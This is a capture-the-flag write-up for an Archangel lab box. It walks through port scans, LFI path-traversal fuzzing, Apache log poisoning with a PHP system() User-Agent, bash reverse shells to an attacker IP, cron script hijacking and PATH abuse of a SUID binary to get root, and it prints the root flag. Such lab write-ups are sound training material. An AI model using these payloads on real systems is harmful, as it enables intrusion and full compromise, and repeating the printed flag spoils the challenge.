Port scanning
```bash
nmap -p- --min-rate=5000 10.10.38.98               
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 23:17 EEST
Nmap scan report for 10.10.38.98
Host is up (0.25s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 17.01 seconds
                                                                                                    
┌──(kali㉿kali)-[/usr/share/peass/linpeas]
└─$ nmap -p 22,80 -sC -sV 10.10.38.98                  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 23:17 EEST
Nmap scan report for 10.10.38.98
Host is up (0.26s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9f:1d:2c:9d:6c:a4:0e:46:40:50:6f:ed:cf:1c:f3:8c (RSA)
|   256 63:73:27:c7:61:04:25:6a:08:70:7a:36:b2:f2:84:0d (ECDSA)
|_  256 b6:4e:d2:9c:37:85:d6:76:53:e8:c4:e0:48:1c:ae:6c (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.88 seconds
```
Ok so there is ssh and a website. seems simple enough.

In the website we can see another hostname of "mafialive.thm" when its visited we can see the first flag.

```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt  -u http://10.10.38.98/pages -t 150 -x html,php 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.38.98/pages
[+] Method:                  GET
[+] Threads:                 150
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 276]
/.htpasswd.php        (Status: 403) [Size: 276]
/.htaccess.php        (Status: 403) [Size: 276]
/.htaccess.html       (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd.html       (Status: 403) [Size: 276]
/gallery.html         (Status: 200) [Size: 13209]
/index.html           (Status: 200) [Size: 0]
Progress: 46351 / 61407 (75.48%)^C
```

I find a test.php where i can use LFI, but it has some restrictions

```bash
ffuf -u http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ -w ~/Downloads/LFI-etc-files-of-all-linux-packages.txt -fw 38,41

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://mafialive.thm/test.php?view=/var/www/html/development_testing/FUZZ
 :: Wordlist         : FUZZ: /home/kali/Downloads/LFI-etc-files-of-all-linux-packages.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 38,41
________________________________________________

..//..//..//..//..///etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 211ms]
..//..//..//..///etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 211ms]
..//..//..//..//..//..///etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 211ms]
..//..//..//..//..//..//..///etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 216ms]
..//..//..//..//..//..//..//..///etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 216ms]
..///..///..///..////etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 218ms]
..///..///..///..///..///..////etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 218ms]
..///..///..///..///..////etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 219ms]
..///..///..///..///..///..///..////etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 229ms]
..///..///..///..///..///..///..///..////etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 238ms]
./.././.././.././..//etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 263ms]
./.././.././.././.././..//etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 263ms]
.//..//.//..//.//..//.//..///etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 245ms]
./.././.././.././.././.././.././..//etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 259ms]
.//..//.//..//.//..//.//..//.//..//.//..//.//..//.//..///etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 234ms]
.//..//.//..//.//..//.//..//.//..//.//..//.//..///etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 241ms]
./.././.././.././.././.././..//etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 260ms]
.//..//.//..//.//..//.//..//.//..///etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 246ms]
.//..//.//..//.//..//.//..//.//..//.//..///etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 242ms]
./.././.././.././.././.././.././.././..//etc/passwd [Status: 200, Size: 1645, Words: 46, Lines: 42, Duration: 268ms]
```



GREAT! We found multiple LFI things to try.

I did more bruteforcing to see what kinda information we could pull from it.

```bash
ffuf -u http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..///FUZZ -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI_simple.txt -fw 38,41 
```

Now i was stuck since i didn't really know how to exploit this LFI to get a reverse shell.
Nvm it was easy I just had a typo in the url
```bash
http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//var/log/apache2/access.log&cmd=id
```

```bash
┌──(kali㉿kali)-[/usr/…/wordlists/SecLists/Fuzzing/LFI]
└─$ curl "http://mafialive.thm/test.php?view=/var/www/html/development_testing//..//..//..//..//var/log/apache2/access.log&cmd=/bin/bash%20-c%20'bash%20-i%20%3E%26%20/dev/tcp/10.6.25.159/4444%200%3E%261'" \
  -H "User-Agent: <?php system(\$_GET['cmd']); ?>" \
  -H "Connection: close"
```

I had troubles getting the burpsuite correctly so i just decided to curl it since it was easier for me.

I imported linpeas over to automate the enumeration.

Random things that caught my eye

```bash
*/1 *   * * *   archangel /opt/helloworld.sh
```

This a script that runs every once in a while
i put the following inside of it to get access to archangel account.
bash -i >& /dev/tcp/10.6.25.159/4444 0>&1

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.6.25.159] from (UNKNOWN) [10.10.89.196] 58166
bash: cannot set terminal process group (21994): Inappropriate ioctl for device
bash: no job control in this shell
archangel@ubuntu:~$ 
```

```bash
archangel@ubuntu:/tmp$  find / -perm -u=s -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/bin/sudo
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/umount
/bin/su
/bin/mount
/bin/fusermount
/bin/ping
/home/archangel/secret/backup
```

the backup file has SETUID bit set which is interesting
archangel@ubuntu:~/secret$ ./backup        
./backup
cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory


So it uses the cp and pathing. 

I created a cp application on the ~/secret folder which run bin/bash and since it runs as root its going to give me root shell when ran

Now i just need to change the path and run the ./backup again

```bash
/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
archangel@ubuntu:~/secret$ cat > cp << EOF
cat > cp << EOF
> #!/bin/bash
#!/bin/bash
> /bin/bash -i
/bin/bash -i
> EOF
EOF
archangel@ubuntu:~/secret$ ls -la
ls -la
total 36
drwxrwx--- 2 archangel archangel  4096 Aug 29 04:01 .
drwxr-xr-x 6 archangel archangel  4096 Nov 20  2020 ..
-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
-rw-rw-r-- 1 archangel archangel    25 Aug 29 04:01 cp
-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt
archangel@ubuntu:~/secret$ ./backup
./backup
cp: cannot stat '/home/user/archangel/myfiles/*': No such file or directory
archangel@ubuntu:~/secret$ chmod +x pc
chmod +x pc
chmod: cannot access 'pc': No such file or directory
archangel@ubuntu:~/secret$ chmod +x cp
chmod +x cp
archangel@ubuntu:~/secret$ export PATH=/home/archangel/secret:$PATH
export PATH=/home/archangel/secret:$PATH
archangel@ubuntu:~/secret$ ./backup
./backup
bash: cannot set terminal process group (21994): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:~/secret# cd /root
cd /root
root@ubuntu:/root# ls
ls
root.txt
root@ubuntu:/root# cat root.txt
cat root.txt
thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}
```


